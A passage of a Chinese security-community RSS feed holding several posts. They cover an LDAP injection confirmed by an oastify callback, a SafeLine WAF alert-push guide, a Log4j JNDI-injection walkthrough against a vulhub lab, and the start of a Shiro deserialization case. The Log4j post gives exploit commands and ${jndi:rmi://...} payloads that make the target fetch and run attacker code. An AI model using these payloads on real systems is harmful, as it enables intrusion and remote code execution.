&quot;action&quot;: &quot;testConnection&quot;,
&quot;connectionUrl&quot;: &quot;ldap://au81uo38t5vxamgnmx284krn7ed518px.oastify.com&quot;,
&quot;bindDn&quot;: &quot;cn=admin,dc=example,dc=com&quot;,
&quot;bindCredential&quot;: &quot;password&quot;,
&quot;useTruststoreSpi&quot;: &quot;ldapsOnly&quot;,
&quot;connectionTimeout&quot;: &quot;5000&quot;
}&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241017/9QsY/1936X1102/image.png&quot; title=&quot;&quot; alt=&quot;1936X1102/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;burp上已经接收到dns信息，至此证明漏洞存在&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241017/433D/1335X384/image.png&quot; title=&quot;&quot; alt=&quot;1335X384/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;既然存在ldap注入了，我们试试能不能执行命令&lt;br&gt;
使用JNDI-Injection-Exploit工具测试&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241018/PBDe/1372X441/image.png&quot; title=&quot;&quot; alt=&quot;1372X441/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241018/VU8z/1066X1053/image.png&quot; title=&quot;&quot; alt=&quot;1066X1053/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;最后没反应，想起来JNDI-Injection-Exploit工具对受害者机器的JDK版本是有要求的，需要低于jdk 1.8版本&lt;br&gt;
看了目标服务器里面环境，docker环境的里的jdk版本已经到17.0.11版本了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241018/zULo/1080X147/image.png?type=ha&quot; title=&quot;&quot; alt=&quot;1080X147/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;后续使用Marshalse工具进行测试也是不行。目前没有找到合适的方法，有没有懂的老哥分享一下如何进一步执行命令或反弹shell&lt;/p&gt;</description><link>https://zone.huoxian.cn/d/2956</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2956</guid><pubDate>Fri, 18 Oct 2024 08:34:48 GMT</pubDate><author>jylove</author><category>原创文章</category><category>漏洞复现</category><category>应用安全</category></item><item><title>雷池WAF自动化实现安全运营实操案例终极篇</title><description>&lt;h2&gt;免责声明&lt;/h2&gt;

&lt;p&gt;本教程仅为合法的教学目的而准备，严禁用于任何形式的违法犯罪活动及其他商业行为，在使用本教程前，您应确保该行为符合当地的法律法规，继续阅读即表示您需自行承担所有操作的后果，如有异议，请立即停止本文章阅读。&lt;/p&gt;

&lt;h2&gt;背景&lt;/h2&gt;

&lt;p&gt;作为一个小型网站的站长，往往面临资源有限(没有RMB)、人手不足的情况(没人就自己)，基本都是1个人负责运营一个或多个网站。&lt;/p&gt;

&lt;p&gt;为了提升运维效率及网站的安全性，我们需要解决以下问题：&lt;/p&gt;

&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;避免频繁的切换安全系统查看日志&lt;/li&gt;
&lt;li&gt;避免人工封禁IP的傻瓜式操作&lt;/li&gt;
&lt;li&gt;将供给详情及告警处置及时通知给网站管理者&lt;/li&gt;
&lt;li&gt;减少因网络安全产生的运维问题&lt;/li&gt;&lt;/ol&gt;

&lt;p&gt;本文主要介绍&lt;code&gt;雷池WAF&lt;/code&gt;、&lt;code&gt;钉钉&lt;/code&gt;联动的场景，但是实际情况下，可能会产生更多的联动效果，比如：雷池自动化拦截通知告警、蜜罐捕获告警通知等。&lt;/p&gt;

&lt;h2&gt;前言&lt;/h2&gt;

&lt;p&gt;在上一期雷池WAF自动化安全运营实操案例中，我们通过日志文本的方式记录WAF告警，并结合inotify-tools监控日志文件的变化来触发钉钉告警通知。然而，这种方法可能会引发一些问题，例如日志提取异常、日志内容截断等。此外，我更希望直接获取完整的攻击payload，以便复现攻击并验证其是否成功。&lt;/p&gt;

&lt;p&gt;雷池WAF还提供了频率限制的黑名单功能，例如通过限制频繁访问或攻击来封禁IP。为了提高运营效率，我希望能够通过钉钉、飞书等工具实时获取封禁IP的通知，而不是手动登录WEB页面查看。&lt;/p&gt;

&lt;p&gt;上篇实操案例中，我们使用了多个shell脚本，流程略显繁琐。因此，我开发了一套自动化程序，直接从雷池WAF数据库提取数据，不再依赖日志存储。同时，该程序能够自动推送攻击告警和频繁限制的黑名单告警，简化了整个安全运营过程。&lt;/p&gt;

&lt;h2&gt;软件介绍&lt;/h2&gt;

&lt;h3&gt;雷池社区版&lt;/h3&gt;

&lt;p&gt;雷池（SafeLine）是长亭科技耗时近 10 年倾情打造的WAF，核心检测能力由智能语义分析算法驱动，目前分为社区版、专业版和企业版。&lt;/p&gt;

&lt;h3&gt;SafeLine_Push&lt;/h3&gt;

&lt;p&gt;雷池WAF推送小助手，可以自动化实现WAF告警日志推送、频繁限制告警IP推送(相当于解开了付费版的部分封印)&lt;/p&gt;

&lt;h2&gt;预计实现效果&lt;/h2&gt;

&lt;h3&gt;原本的效果&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-15/1728958258-809242-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;


&lt;h3&gt;想要实现的效果&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-15/1728958275-890895-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;要想能够实现将完整的请求包截取到的情况，那么就需要对WAF数据库的另外一个表下手，这个表为&lt;code&gt;PUBLIC.MGT_DETECT_LOG_DETAIL&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;原本我只是对&lt;code&gt;PUBLIC.MGT_DETECT_LOG_BASIC&lt;/code&gt;这个表进行查询操作，上篇中已经提到了，此时有2个方法，一种为在原有数据库中进行查询，或者是将数据库的这两个表进行迁移，迁移到新的数据库中来进行操作。&lt;/p&gt;

&lt;p&gt;雷池WAF中频繁限制的告警效果预计如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-15/1728958295-413183-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;


&lt;h2&gt;前置工作&lt;/h2&gt;

&lt;h3&gt;映射雷池WAF数据库端口&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;#!/bin/bash

# 运行安装/更新脚本
bash -c &quot;$(curl -fsSLk https://waf-ce.chaitin.cn/release/latest/upgrade.sh)&quot;

# 进入 /data/safeline 目录
cd /data/safeline || { echo &quot;/data/safeline not found!&quot;; exit 1; }

# 检查 compose.yaml 是否存在并备份
if [ -f compose.yaml ]; then
    echo &quot;Backing up the current compose.yaml&quot;
    cp compose.yaml compose.yaml.bak
else
    echo &quot;compose.yaml not found in /data/safeline!&quot;
    exit 1
fi

# 检查是否已经存在端口映射
if grep -q &quot;5433:5432&quot; compose.yaml; then
    echo &quot;PostgreSQL port mapping already exists.&quot;
else
    # 使用 sed 插入 ports 字段到 postgres 服务中
    sed -i &#39;/container_name: safeline-pg/a\    ports:\n      - 5433:5432&#39; compose.yaml
    echo &quot;PostgreSQL port mapping added to 5433:5432.&quot;
fi

# 重新启动容器，应用更改
docker compose down --remove-orphans &amp;amp;&amp;amp; docker compose up -d

echo &quot;Containers restarted with the updated compose.yaml&quot;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这个脚本适用于每次更新时，重新映射数据库端口，如果已经最新版，可以注释掉更新脚本命令。&lt;/p&gt;

&lt;h3&gt;配置数据库配置文件&lt;/h3&gt;

&lt;p&gt;通过&lt;code&gt;cat /data/safeline/.env | grep POSTGRES_PASSWORD | tail -n 1 | awk -F &#39;=&#39; &#39;{print $2}&#39;&lt;/code&gt;查看数据库密码&lt;/p&gt;

&lt;p&gt;然后在&lt;code&gt;/var/scripts/.pgpass&lt;/code&gt;中写入如下代码，然后给这个文件添加600的权限。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;localhost:5433:safeline-ce:safeline-ce:abcd #把abcd替换成第2步中获取到的密码&lt;/code&gt;&lt;/pre&gt;

&lt;h2&gt;消息推送配置&lt;/h2&gt;

&lt;p&gt;从GitHub中下载文件&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;git clone https://github.com/Fiary-Tale/SafeLine_Push&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;从上述下载的为源代码及已编译的版本(存放于mark文件夹中)。&lt;/p&gt;

&lt;h3&gt;配置文件&lt;/h3&gt;

&lt;h4&gt;VulConfig.json&lt;/h4&gt;

&lt;p&gt;该配置文件映射了雷池WAF数据库中部分字段数据，用于告警推送中的触发规则，这个配置文件可按照需求自行填写，目前并未完全覆盖全部触发规则(本人在数据库中没有找到与之相对应的中文触发规则)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;注意：这个文件一定要放入到&lt;code&gt;/var/scripts/VulConfig.json&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;{
  &quot;replacements&quot;: {
    &quot;m_sqli&quot;: &quot;SQL注入&quot;,
    &quot;m_xss&quot;: &quot;跨站脚本攻击&quot;,
    &quot;m_csrf&quot;: &quot;跨站请求伪造&quot;,
    &quot;m_cmd_injection&quot;: &quot;命令执行&quot;
  }
}&lt;/code&gt;&lt;/pre&gt;

&lt;h4&gt;config.yaml&lt;/h4&gt;

&lt;p&gt;该配置文件为消息推送时使用的token及推送方法，目前只编写了钉钉和Server酱，其他可自行补充!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;注意：这个文件一定要放入到&lt;code&gt;/var/scripts/config.yaml&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;token: &quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;
method: &quot;dingtalk&quot; # 可以是 &quot;dingtalk&quot; 或 &quot;serverchan&quot;&lt;/code&gt;&lt;/pre&gt;

&lt;h4&gt;GeoLite2-City.mmdb&lt;/h4&gt;

&lt;p&gt;该文件非配置文件，为开源的Geo数据库，但为必须文件，这个文件用于查询IP的归属地，某些方面无法与雷池WAF数据库自身的归属地相比，但查询数据库中的归属地有些繁琐，因此采用Geo查询归属地。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;注意：归属地GeoLite2-City.mmdb文件一定要与程序在同一目录&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;注意：在钉钉推送的安全设置中，我设置的是自定义关键词：入侵检测事件&lt;/strong&gt;&lt;/p&gt;

&lt;h4&gt;build.bat&lt;/h4&gt;

&lt;p&gt;我是于Windows的环境中开发的，因此我编写了一个bat文件，如果有需要大家可以自行编译，记得安装golang开发环境哟!&lt;/p&gt;

&lt;h2&gt;目前已实现效果&lt;/h2&gt;

&lt;h3&gt;攻击告警推送&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-15/1728958320-654931-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;h3&gt;频繁限制处理推送&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-15/1728958332-749979-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;


&lt;h2&gt;设置开机自启动&lt;/h2&gt;

&lt;p&gt;在&lt;code&gt;/etc/rc.local&lt;/code&gt;中追加&lt;code&gt;nohup /var/scripts/SafeLine_Push_linux_amd64 &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&lt;/code&gt;&lt;/p&gt;

&lt;h2&gt;后记&lt;/h2&gt;

&lt;p&gt;在测试中发现，频繁的告警有些烦人，比如:我为了产生短时间内同一IP大量攻击，进入频繁限制的封禁告警推送，开始频繁攻击后，收到了大量的攻击告警推送以及其他一些问题待修复!&lt;/p&gt;

&lt;h3&gt;互相探讨及待修复&lt;/h3&gt;

&lt;ul&gt;&lt;li&gt;短时间大量的攻击，告警推送如何处理？&lt;/li&gt;
&lt;li&gt;IP归属地的优化&lt;/li&gt;
&lt;li&gt;频繁告警推送中触发规则及拦截结果优化&lt;/li&gt;
&lt;li&gt;自动化保留频繁攻击的IP并上传威胁情报&lt;/li&gt;&lt;/ul&gt;</description><link>https://zone.huoxian.cn/d/2955-waf</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2955-waf</guid><pubDate>Tue, 15 Oct 2024 02:12:53 GMT</pubDate><author>Fariy</author><category>原创文章</category><category>安全运营</category></item><item><title>JNDI注入 漏洞工具使用和对比</title><description>&lt;p&gt;说到JNDI注入漏洞工具，最常用的应该就是这两个了吧&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;&lt;p&gt;Marshalsec工具&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;JNDI-Injection-Exploit 工具&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;


&lt;h1&gt;Marshalsec工具获取与编译&lt;/h1&gt;
&lt;h2&gt;介绍&lt;/h2&gt;
&lt;p&gt;Marshalsec是一个用于Java反序列化漏洞利用的工具，由马克斯·贝克勒（mbechler）开发。它主要用于帮助安全研究人员和渗透测试人员分析和利用Java应用程序中的反序列化漏洞。&lt;/p&gt;

&lt;h2&gt;项目地址：&lt;/h2&gt;
&lt;p&gt;Marshalsec的GitHub仓库地址为：&lt;a href=&quot;https://github.com/mbechler/marshalsec&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://github.com/mbechler/marshalsec&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;另一个项目镜像地址为：&lt;a href=&quot;https://gitcode.com/gh_mirrors/ma/marshalsec&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://gitcode.com/gh_mirrors/ma/marshalsec&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;环境准备：&lt;/h2&gt;
&lt;p&gt;确保系统中已经安装了Java和Maven。如果没有，可以通过以下命令安装：&lt;/p&gt;

&lt;p&gt;对于Ubuntu/Linux：sudo apt-get install default-jdk maven&lt;/p&gt;

&lt;p&gt;对于CentOS/RHEL：sudo yum install java-1.8.0-openjdk-devel maven&lt;/p&gt;

&lt;h2&gt;克隆与编译&lt;/h2&gt;
&lt;p&gt;从GitHub克隆Marshalsec项目：git clone &lt;a href=&quot;https://github.com/mbechler/marshalsec.git&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://github.com/mbechler/marshalsec.git&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;进入项目目录：cd marshalsec&lt;/p&gt;

&lt;p&gt;编译项目：（需要 Java 8）mvn clean package -DskipTests&lt;/p&gt;

&lt;p&gt;编译完成后，target/目录下会产生marshalsec-{version}-all.jar文件。&lt;/p&gt;

&lt;h2&gt;使用方法&lt;/h2&gt;
&lt;p&gt;java -cp marshalsec-[VERSION]-SNAPSHOT-all.jar marshalsec.&amp;lt;Unmarshaller&amp;gt; [-a] [-v] [-t] [&amp;lt;gadget_type&amp;gt; [&amp;lt;arguments...&amp;gt;]]&lt;/p&gt;


&lt;p&gt;-a - 生成/测试该序列化器的所有有效载荷。&lt;/p&gt;

&lt;p&gt;-t - 测试模式，在生成后立即反序列化生成的有效载荷。&lt;/p&gt;

&lt;p&gt;-v - 详细模式，例如在测试模式下显示生成的有效载荷。&lt;/p&gt;

&lt;p&gt;gadget_type - 特定漏洞标识符，省略则显示特定序列化器可用的漏洞。&lt;/p&gt;

&lt;p&gt;arguments - 漏洞相关的参数&lt;/p&gt;

&lt;h1&gt;JNDI-Injection-Exploit 工具获取与编译&lt;/h1&gt;

&lt;h2&gt;介绍&lt;/h2&gt;

&lt;p&gt;JNDI-Injection-Exploit是一个用于生成可工作的JNDI链接并提供后台服务的工具，通过启动RMI服务器、LDAP服务器和HTTP服务器来实现。该工具主要用于测试JNDI注入漏洞，如Jackson、Fastjson反序列化漏洞等&lt;/p&gt;

&lt;h2&gt;项目地址：&lt;/h2&gt;
&lt;p&gt;JNDI-Injection-Exploit的GitHub仓库地址为：&lt;a href=&quot;https://github.com/welk1n/JNDI-Injection-Exploit&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://github.com/welk1n/JNDI-Injection-Exploit&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;另一个项目镜像地址为：&lt;a href=&quot;https://gitcode.com/gh_mirrors/jn/JNDI-Injection-Exploit/overview&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://gitcode.com/gh_mirrors/jn/JNDI-Injection-Exploit/overview&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;环境准备：&lt;/h2&gt;
&lt;p&gt;确保系统中已经安装了Java和Maven。如果没有，可以通过以下命令安装：&lt;/p&gt;

&lt;p&gt;对于Ubuntu/Linux：sudo apt-get install default-jdk maven&lt;/p&gt;

&lt;p&gt;对于CentOS/RHEL：sudo yum install java-1.8.0-openjdk-devel maven&lt;/p&gt;

&lt;h2&gt;克隆与编译&lt;/h2&gt;
&lt;p&gt;从GitHub克隆JNDI-Injection-Exploit项目：&lt;br&gt;
    git clone &lt;a href=&quot;https://github.com/welk1n/JNDI-Injection-Exploit.git&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://github.com/welk1n/JNDI-Injection-Exploit.git&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;进入项目目录：cd JNDI-Injection-Exploit&lt;/p&gt;

&lt;p&gt;编译项目：（需要 Java 8）mvn clean package -DskipTests&lt;/p&gt;

&lt;p&gt;编译完成后，target/目录下会产生JNDI-Injection-Exploit-{version}-SNAPSHOT-all.jar文件。&lt;/p&gt;

&lt;h2&gt;不想自己编译的可以直接下载已经编译好的：&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;使用方法&lt;/h2&gt;
&lt;p&gt;在命令行中运行以下命令：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其中:&lt;/p&gt;

&lt;p&gt;-C - 远程class文件中要执行的命令。&lt;/p&gt;

&lt;p&gt;（可选项 , 默认命令是mac下打开计算器，即&quot;open /Applications/Calculator.app&quot;）&lt;/p&gt;

&lt;p&gt;-A - 服务器地址，可以是IP地址或者域名。&lt;/p&gt;

&lt;p&gt;（可选项 , 默认地址是第一个网卡地址）&lt;/p&gt;

&lt;p&gt;注意:&lt;/p&gt;

&lt;p&gt;要确保 1099、1389、8180端口可用，不被其他程序占用。&lt;/p&gt;

&lt;p&gt;或者你也可以在run.ServerStart类26&lt;sub&gt;28行更改默认端口。&lt;/sub&gt;&lt;/p&gt;

&lt;p&gt;命令会被作为参数传入Runtime.getRuntime().exec()，&lt;/p&gt;

&lt;p&gt;所以需要确保命令传入exec()方法可执行。&lt;/p&gt;

&lt;p&gt;bash等可在shell直接执行的相关命令需要加双引号，比如说 java -jar JNDI.jar -C &quot;bash -c ...&quot;&lt;/p&gt;


&lt;h2&gt;接下来演示如何利用这两个工具进行漏洞利用，以此来对比两个工具的区别&lt;/h2&gt;

&lt;p&gt;为此我们需要构造一个漏洞环境，当然最便捷的方式就是使用docker 直接拉取一个漏洞环境了，我们用之前很火的漏洞log4j2的漏洞来演示&lt;/p&gt;

&lt;p&gt;进入到vulhubz/log4j/CVE-2021-44228/目录下&lt;br&gt;
执行&lt;br&gt;
docker-compose up -d 拉取漏洞环境&lt;/p&gt;

&lt;p&gt;启动成功后访问一下漏洞环境&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://192.168.19.158:8983/solr/#/&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;http://192.168.19.158:8983/solr/#/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241014/MRJF/1377X781/image.png&quot; title=&quot;&quot; alt=&quot;1377X781/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;


&lt;h2&gt;Marshalsec工具进行利用&lt;/h2&gt;

&lt;p&gt;进入到我们构建好的Marshalsec的jar文件下，首先我们需要先有一个TouchFile.java文件，文件内容为我们需要执行的命令，使用javac TouchFile.java生成class执行文件&lt;br&gt;
TouchFile.java文件内容&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241014/YDWa/711X372/image.png&quot; title=&quot;&quot; alt=&quot;711X372/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
    &lt;br&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241014/ByYs/753X63/image.png?type=ha&quot; title=&quot;&quot; alt=&quot;753X63/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;成功生成TouchFile.class文件后，需要使用python开启一个web目录，以便受害者机器能下载到该文件&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;python3 -m http.server 8000
python2 -m SimpleHTTPServer 8000&lt;/code&gt;&lt;/pre&gt;


&lt;p&gt;接下来使用工具开启RMIserver&lt;br&gt;
以下的192.168.101.135:8080为刚才开启的web目录地址，TouchFile为TouchFile.java文件中的公开的类名，需要保持一致&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;java -cp marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.jndi.RMIRefServer  &quot;http://192.168.19.1:8000/#TouchFile&quot;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241014/8meW/1737X114/image.png?type=ha&quot; title=&quot;&quot; alt=&quot;1737X114/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;


&lt;p&gt;发送利用paylaod&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;http://192.168.19.158:8983/solr/admin/cores?action=${jndi:rmi://192.168.19.1:1099/TouchFile}  #其中192.168.19.1:1099 为以上命令开启后的ip地址和端口，可以从图看出来为1099，TouchFile为TouchFile为TouchFile.java文件中的公开的类名，需要保持一致：&lt;/code&gt;&lt;/pre&gt;


&lt;p&gt;可以看到受害者机器已经下载了TouchFile文件&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241014/pHUo/1083X208/image.png&quot; title=&quot;&quot; alt=&quot;1083X208/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;Marshalsec服务已经有响应&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241014/5yWV/1438X567/image.png&quot; title=&quot;&quot; alt=&quot;1438X567/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;br&gt;
接下来我们看下受害者是否已经执行了我们想要执行的命令touch /tmp/success&lt;/p&gt;

&lt;p&gt;受害者机器已经成功执行了该命令&lt;br&gt;
&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241014/t6f3/1432X94/image.png?type=ha&quot; title=&quot;&quot; alt=&quot;1432X94/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;



&lt;h2&gt;JNDI-Injection-Exploit工具进行利用&lt;/h2&gt;
&lt;p&gt;直接使用命令&lt;/p&gt; 

&lt;pre&gt;&lt;code&gt;java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C touch /tmp/20241014 #不使用-A 默认主机IP&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241014/3FwA/1438X436/image.png&quot; title=&quot;&quot; alt=&quot;1438X436/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;发送利用paylaod&lt;br&gt;
    &lt;a href=&quot;http://192.168.19.158:8983/solr/admin/cores?action=$%7Bjndi:rmi://192.168.1.9:1099/ewvnfv&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;http://192.168.19.158:8983/solr/admin/cores?action=${jndi:rmi://192.168.1.9:1099/ewvnfv&lt;/a&gt;}  #其中192.168.19.1:1099 为以上命令开启后的ip地址和端口，可以从图看出来为1099，ewvnfv为随机生成的类，需要和命令生成的保持一致：&lt;/p&gt;

&lt;p&gt;JNDI-Injection-Exploit服务已经有响应&lt;br&gt;
&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241014/dtQp/1452X345/image.png&quot; title=&quot;&quot; alt=&quot;1452X345/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;接下来我们看下受害者是否已经执行了我们想要执行的命令touch /tmp/20241014&lt;/p&gt;

&lt;p&gt;受害者机器已经成功执行了该命令&lt;br&gt;
&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241014/Wi0e/1471X66/image.png?type=ha&quot; title=&quot;&quot; alt=&quot;1471X66/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
&lt;h2&gt;通过以上的实验证明&lt;/h2&gt;

&lt;p&gt;JNDI-Injection-Exploit：&lt;/p&gt;

&lt;p&gt;使用场景：适用于需要利用JNDI注入漏洞进行攻击的场景&lt;/p&gt;

&lt;p&gt;特点：简单易用、支持多种攻击方式、免费开源等&lt;/p&gt;

&lt;p&gt;Marshalsec：&lt;/p&gt;

&lt;p&gt;使用场景：适用于需要利用Java反序列化漏洞进行攻击的场景，如渗透测试和安全研究等。&lt;/p&gt;

&lt;p&gt;特点：功能强大、支持多种序列化协议、易于定制等。它提供了丰富的选项和参数来生成恶意的序列化数据，并支持多种攻击方式。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;JNDI-Injection-Exploit对比起来，在实现rmi/ldap注入的时候，要简单的多，只需要一步执行到位，而不需要像Marshalsec需要多几个步骤。所以漏洞利用过程中，更多的都是使用JNDI-Injection-Exploit工具&lt;/strong&gt;&lt;/p&gt;
</description><link>https://zone.huoxian.cn/d/2954-jndi</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2954-jndi</guid><pubDate>Mon, 14 Oct 2024 09:41:05 GMT</pubDate><author>jylove</author><category>原创文章</category><category>tool</category><category>实战攻防</category></item><item><title>奇葩环境之shiro 反序列化漏洞</title><description>&lt;p&gt;在日常工作中，遇见奇葩环境之shiro 反序列化漏洞&lt;/p&gt;
&lt;h3&gt;#1 背景描述&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;1.不出网！
2.没有传统的web目录，不能echo到某系统下
3.header头限制大小
4.liqun的利用链小，能简单执行命令，但是不能写内存马，其他工具利用链不能判断,
5.不能echo上马，不能像传统环境，此为spring框架，没有传统的jsp目录&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;#正文开始&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;有正确的shirokey，获取方式，是某某泄漏找到的。用liqun已确认存在反序列化漏洞。&lt;/strong&gt;&lt;br&gt;
&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-09/1728461947-795464-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;但是用shiroattack不能找到利用链&lt;/strong&gt;  😅 &lt;br&gt;
&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-09/1728462021-106859-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;抓包分析，分析原因，将流量代理到Burp，发现检查利用链的时候，发现是400错误：&lt;br&gt;
&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-09/1728462113-890808-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;br&gt;
&lt;strong&gt;可以发现是HTTP头中rememberMe的数据太大，后端根本就没有处理到rememberMe里面的反序列化数据。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;发现了问题，就得解决问题&lt;br&gt;
&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-09/1728462218-123847-wx20241009-162318.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;#解决思路&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1、 优化减少rememberMe头中SpringEcho模版的代码
2、 通过反序列化修改后端的header buff size （网上方案，感觉稍微复杂，而且网上分析都是基于tomcat的，与实际场景存在差异）&lt;/code&gt;&lt;/pre&gt;
